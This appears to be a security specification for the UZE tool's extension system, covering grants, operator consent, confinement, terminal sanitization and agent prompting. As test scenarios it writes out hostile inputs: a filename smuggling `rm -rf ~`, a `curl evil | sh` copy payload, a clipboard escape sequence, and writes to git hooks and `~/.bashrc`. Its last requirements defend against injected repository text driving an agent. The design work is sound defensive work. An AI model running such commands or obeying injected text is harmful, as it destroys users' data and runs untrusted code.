## Purpose

Keeps extension code, which UZE itself runs on the operator's machine, from
reaching more than it was granted, from deceiving the operator through the
terminal, and from being installed or widened without the operator saying so.

## ADDED Requirements

### Requirement: An extension declares every grant it needs
An extension manifest SHALL list, under `wants`, every capability it uses:
`exec:<name>`, `net`, `read:checkout`, `clipboard`, `open_path`, `notify`,
`store:global`, `resident`, `agent:observe`, `agent:prompt`,
`agent:prompt:auto` and `agent:control`. No grant SHALL write the
checkout. A declaration that uses a capability it did not list SHALL be
refused by the check and at install.

> **Review findings** (design.md, *Triage*): S2, S3, S7.

#### Scenario: An undeclared program is refused
- **WHEN** an action runs `[gh, pr, list]` and `wants` has no `exec:gh`
- **THEN** `uze agent plugin check` fails naming the action and the missing grant

#### Scenario: A packaged program needs no grant
- **WHEN** an action runs a program shipped inside the extension's own directory and `wants` has no `exec:` for it
- **THEN** the check accepts the action, since only external programs need an `exec:` grant

#### Scenario: A write grant does not exist
- **WHEN** a manifest asks for `write:checkout`
- **THEN** the check refuses it as a grant the platform does not offer, saying no extension writes the checkout

### Requirement: A grant is offered only once its enforcement exists
The check SHALL refuse a grant whose enforcement this build does not carry
yet, naming the change that brings it, so that no grant is ever consented
to before the host can enforce it: `read:checkout`, `clipboard` and
`open_path` with the manifest and scripts; `exec:` and `store:global` with
confinement; `agent:*` and `notify` with the bridge; `resident` with the
resident tier; `net` with `fetch`.

#### Scenario: A program is refused before confinement exists
- **WHEN** a build without the program runner checks a manifest declaring `run "./bin/x.sh"` or `wants exec:gh`
- **THEN** the check refuses it saying programs arrive with confinement, and the rest of the extension is checked

### Requirement: Grants are consented to, recorded, and re-asked when they widen
Installing a plugin that carries an extension SHALL show the operator the
extension's grants and SHALL NOT enable the extension until the operator
accepts them; no extension SHALL be enabled silently, from any marketplace.
The accepted grants SHALL be recorded against the extension's identity
(`plugin@marketplace/id`) and the digest of its directory.

> **Review findings** (design.md, *Triage*): S4, enablement scope.

#### Scenario: Install asks before enabling
- **WHEN** the operator installs a plugin whose extension wants `exec:openspec` and `clipboard`
- **THEN** UZE lists both grants and the extension stays disabled until they are accepted

#### Scenario: Non-interactive install does not enable
- **WHEN** `uze install` runs without a terminal and a plugin carries an extension with unaccepted grants
- **THEN** the plugin's other capabilities install, the extension stays disabled, and the command reports that it needs consent

#### Scenario: A same-named extension from another plugin is a stranger
- **WHEN** `acme@github` and `evil@github` both ship `extensions/gsd-band/` and the first is enabled
- **THEN** the second shows as needing consent and shares no record, store, cache or keys with the first

#### Scenario: What was digested is what runs
- **WHEN** a file under `extensions/<id>/` changes on disk after the loader read the tree into memory
- **THEN** the session keeps running the bytes it digested, and the change is seen only by the next load, which compares its digest to the record

### Requirement: Consent is given in UZE's chrome, never from an agent's pane
Enabling an extension SHALL happen only on the Extensions screen or at the
`uze install` prompt on a TTY. The CLI SHALL refuse to enable when
`UZE_AGENT` is in the environment or the launch record points at an
agent's pane, and SHALL offer no flag that accepts grants without asking.

#### Scenario: An agent cannot enable an extension
- **WHEN** a process in an agent's pane runs `uze install` for a plugin carrying an extension
- **THEN** the plugin installs, the extension stays disabled, and the report says enabling is done on the Extensions screen

#### Scenario: There is no flag that consents
- **WHEN** the operator runs `uze install --yes` or any flag meant to skip prompts
- **THEN** the extension still waits for consent in UZE's chrome

### Requirement: An update that widens grants waits for consent
An update whose manifest asks for a grant not previously accepted SHALL leave
the extension disabled, still at its accepted grants, until the operator
accepts the wider set; an update that only narrows SHALL apply without
asking. An update of an extension whose accepted grants are not enforced on
this machine SHALL wait for consent on any change of its digest.

> **Review findings** (design.md, *Triage*): S5.

#### Scenario: A widened update is held
- **WHEN** an update adds `net` to an extension whose accepted grants did not include it
- **THEN** the extension is disabled with a notice naming `net` as the new grant, and no program of the new version runs before it is accepted

#### Scenario: A narrowed update applies
- **WHEN** an update drops `net` from an extension whose accepted grants included it
- **THEN** the update applies without asking the operator

#### Scenario: The same grants apply and are shown
- **WHEN** an update keeps the accepted grants of an extension whose grants are all enforced on this machine
- **THEN** the update applies without asking, and the Extensions screen shows the update's date, "same grants" and the new digest

#### Scenario: Unenforced code is re-read
- **WHEN** confinement is unavailable and an extension holding `exec:nvidia-smi` is updated with the same grants
- **THEN** it is held, naming the digest change, until the operator accepts it again

### Requirement: The host executes only what was declared, from where it was declared
The host SHALL run only a declaration of the accepted manifest, named by its
id, with the argv rebuilt from that manifest and template values substituted
as whole elements, never re-parsed. A relative program path SHALL resolve
inside the extension's directory in the Store after following links, and
SHALL be refused if it resolves outside it.

> **Review findings** (design.md, *Triage*): S8, S9.

#### Scenario: A value cannot inject arguments or commands
- **WHEN** a selected item is named `x; rm -rf ~` and an action runs `[openspec, archive, "{name}"]`
- **THEN** `openspec` receives the single argument `x; rm -rf ~` and no shell ever sees it

#### Scenario: A path cannot escape the package
- **WHEN** a manifest declares `run "../../bin/tool"` or a link inside the extension points outside it
- **THEN** the check and the host refuse the program as resolving outside the extension

#### Scenario: A widened update cannot race a run
- **WHEN** an update that widens grants lands while a surface of the extension is open
- **THEN** every run until the operator accepts is rebuilt from the manifest that was accepted, never from the new one

### Requirement: A program's path is pinned when the extension is enabled
A bare program name SHALL run only through its `exec:` grant, at the
absolute path the host resolved on its own search path and recorded when
the extension was enabled, shown on the consent screen, never by searching
`PATH` at run time. The host SHALL refuse a resolution under the checkout,
`$UZE_HOME`, a temporary directory or a WSL `/mnt/*` path, and SHALL
resolve again only when the operator asks.

#### Scenario: A changed PATH changes nothing
- **WHEN** the operator's `PATH` gains `./node_modules/.bin` after `gh` was pinned to `/usr/bin/gh`
- **THEN** a run still executes the recorded `/usr/bin/gh`

#### Scenario: A runner is named for what it is
- **WHEN** `wants` has `exec:python3`
- **THEN** the consent screen says `python3` can run anything, the same as running any code as the operator

#### Scenario: A shebang names its interpreter's grant
- **WHEN** a packaged script begins with `#!/usr/bin/env python3`
- **THEN** the check requires `exec:python3`, and a run executes the pinned `python3` with the script as its argument, so `env` never runs

#### Scenario: A missing program does not block enabling
- **WHEN** `exec:gh` resolves to nothing on this machine
- **THEN** the extension can still be enabled, its source shows "`gh` not found", and the host resolves again only from the Extensions screen

### Requirement: Programs run with a scrubbed environment and confined where possible
A program SHALL start with an environment built from an allowlist (locale,
terminal, `PATH`, `HOME`, and the contract's own variables) and SHALL NOT
inherit tokens, credentials or the operator's other variables. Where
confinement is unavailable, the consent screen and `uze doctor` SHALL say the
grants are declared but not enforced on this machine.

> **Review findings** (design.md, *Triage*): enabling where confinement is missing.

#### Scenario: A token in the environment does not leak
- **WHEN** the operator's environment has `GITHUB_TOKEN` set and a source prints its environment
- **THEN** `GITHUB_TOKEN` is absent from what the source saw

#### Scenario: Missing confinement is disclosed
- **WHEN** the platform offers no confinement and an extension wants `exec:nvidia-smi`
- **THEN** the consent screen asks the `exec:` grants on their own, after the rest, with the text "This machine cannot confine programs. `nvidia-smi` runs as you, with everything you can reach: your files, your keys, the network.", the record says confinement was not enforced, and `uze doctor`, `uze status` and the Extensions screen show "runs as you"

#### Scenario: A local socket is out of reach
- **WHEN** on Linux an extension holding `net` connects to `/var/run/docker.sock` or to `$XDG_RUNTIME_DIR/bus`
- **THEN** creating the socket fails, and the program's run is reported as it exited

#### Scenario: Confinement that failed is not papered over
- **WHEN** the helper cannot apply the ruleset on a run of an extension whose record says confinement was enforced when accepted
- **THEN** the run is refused, the extension shows as needing consent again, and nothing runs "as you" by surprise

### Requirement: A confined program reaches only what it was granted
Where the platform offers confinement, a program SHALL be confined to reading
the checkout, its Git common directory and its own extension directory,
writing nowhere but a per-run scratch directory the host removes, and
reaching no network unless granted `net`. Its signals SHALL reach only its
own process group, and its processes, CPU, open files, memory and scratch
size SHALL be bounded.

> **Review findings** (design.md, *Triage*): S1, S6, S10, S13, S17, S18.

#### Scenario: Confinement denies a write into the checkout
- **WHEN** on a platform with confinement a program writes `.git/hooks/pre-commit` or `README.md`
- **THEN** the write fails and the run is reported as it exited

#### Scenario: Confinement denies a write into the home directory
- **WHEN** on a platform with confinement a program writes `~/.bashrc`
- **THEN** the write fails and the run is reported as it exited

#### Scenario: A fork bomb is contained
- **WHEN** a program forks without limit within its time limit
- **THEN** its descendants are reaped with it when the limit passes, and no process of the run survives

### Requirement: Nothing an extension produces reaches the terminal unsanitized
Every string that originates in an extension — manifest labels, source
answers, action replies, standard error shown as a reason — SHALL be stripped
of control characters, escape sequences and bidirectional overrides before it
is drawn or copied, and SHALL be bounded in length. An extension SHALL NOT be
able to move the cursor, change the terminal title, write the clipboard
through an escape sequence, or emit a hyperlink.

> **Review findings** (design.md, *Triage*): S11, S14.

#### Scenario: An escape sequence is drawn inert
- **WHEN** a source answers an item named `"\u001b]52;c;ZXZpbA==\u0007build"`
- **THEN** the navigator shows `build` with the sequence removed and the clipboard is unchanged

### Requirement: Strings are cleaned as they are read, by display width
Every string from an extension SHALL enter UZE through one type that
sanitizes on deserialize, so an unclean string cannot be constructed; it
SHALL also drop format, zero-width and tag characters, line and paragraph
separators and combining marks stacked beyond two, and SHALL bound length in
display cells, not bytes. The declared engine SHALL build spans only through
that type.

#### Scenario: Invisible characters are dropped
- **WHEN** a source answers a label with Unicode tag characters and a zero-width joiner between visible words
- **THEN** the label is drawn with the visible words only, and the test fails if any span of the declared engine bypassed the cleaning type

#### Scenario: Width is measured in cells
- **WHEN** a label of 40 wide East Asian characters is bounded to 40 cells
- **THEN** it is cut at 20 characters, not at 40 bytes

### Requirement: Host chrome is never drawable by an extension
Confirmations, toasts, consent screens and the frame's title SHALL be drawn by
the host, and each SHALL name the extension it speaks for. An extension SHALL
NOT draw outside the surface it was given nor produce anything that looks like
host chrome. A confirmation's body and button text MAY come from the manifest
and SHALL be shown under the extension's name.

> **Review findings** (design.md, *Triage*): S15.

#### Scenario: A confirmation is attributed
- **WHEN** an extension's action asks for confirmation
- **THEN** the dialog names the extension, so it cannot pass for a question UZE itself is asking

### Requirement: An extension is attributed by identity, never by display name
Everywhere the host speaks for an extension (a strip, a dialog, a toast, a
notice, a consent screen) it SHALL print `id · plugin@marketplace`, never the
manifest's display name. An id SHALL match `^[a-z0-9][a-z0-9-]{0,31}$`, and
`code`, `architect`, `spec`, `uze` and `timeline` SHALL be refused.

#### Scenario: A homoglyph name does not reach the chrome
- **WHEN** an extension's manifest names it `Cоde` with a Cyrillic letter
- **THEN** its strip, dialogs and toasts say its id and plugin, and the display name appears only in the Extensions screen's list beside them

#### Scenario: A reserved id is refused
- **WHEN** a plugin ships `extensions/timeline/extension.kdl`
- **THEN** the check refuses the id as reserved by the host

### Requirement: Clipboard and opening paths happen only on a gesture
A write to the clipboard or an open of a path SHALL happen only as the result
of an action the operator invoked, never from a source's answer or an event.
A path to open SHALL resolve inside the checkout. The toast of a copy SHALL
show the text that was copied, cut for the screen but whole on the
clipboard; a copy of more than one line or over 256 bytes SHALL ask first.

> **Review findings** (design.md, *Triage*): S16.

#### Scenario: A source cannot write the clipboard
- **WHEN** a source's answer contains a field named `clipboard`
- **THEN** it is ignored as data and the clipboard is unchanged

#### Scenario: What was copied is what is shown
- **WHEN** an action labelled `Copy branch` copies `main; curl evil | sh`
- **THEN** the toast shows `main; curl evil | sh`, not the label

#### Scenario: A long copy asks first
- **WHEN** an action would copy three lines
- **THEN** the host shows them and copies only after the operator accepts

### Requirement: An extension reaches none of UZE's own state
No extension program or declaration SHALL be given a path under `$UZE_HOME`
other than its own extension directory in the Store, read-only, nor any
record, receipt or cache of UZE's. Confinement, where available, SHALL deny
the rest of `$UZE_HOME`.

> **Review findings** (design.md, *Triage*): S1, S10.

#### Scenario: The Store is not handed over
- **WHEN** a source runs
- **THEN** its context names the checkout and its own extension directory and nothing else under `$UZE_HOME`

### Requirement: Consent states what a grant combination can do
The consent screen SHALL lead with the implicit rights and with what the
grants can do together, and SHALL say that `agent:prompt` gives the
extension what the agent can do. `agent:prompt:auto` SHALL be asked
separately from `agent:prompt`, after it, and never as part of a list
accepted in one gesture.

#### Scenario: Prompt and network together are named
- **WHEN** an extension wants `agent:prompt` and `net`
- **THEN** the consent screen says the extension can have the agent act on the checkout and send what it reads over the network

#### Scenario: Unattended prompting is its own question
- **WHEN** an extension wants `agent:prompt:auto`
- **THEN** the operator is asked about it on its own, after the other grants, and declining it leaves the rest enabled with prompts only on a gesture

### Requirement: Untrusted channels never start an agent action alone
A source's answer, an event and a composed tree SHALL NOT cause a
clipboard write or an open of a path, and SHALL cause a write into an agent
only under `agent:prompt:auto`, with the manifest's fixed text or a declared
closed set, never text they carry. Each write SHALL be attributed where the
operator sees it.

#### Scenario: An event payload cannot type into an agent
- **WHEN** a tool event's summary contains `rm -rf ~` and a source mapped to that event answers it as prompt text
- **THEN** no text reaches any agent but the manifest's fixed text or a member of its declared closed set

#### Scenario: Repository content never becomes a prompt
- **WHEN** an extension holding `agent:prompt:auto` reads a `STATE.md` that contains an instruction and answers it as the next prompt
- **THEN** the host sends nothing but the manifest's fixed text or a member of its declared closed set, and the answered text is ignored
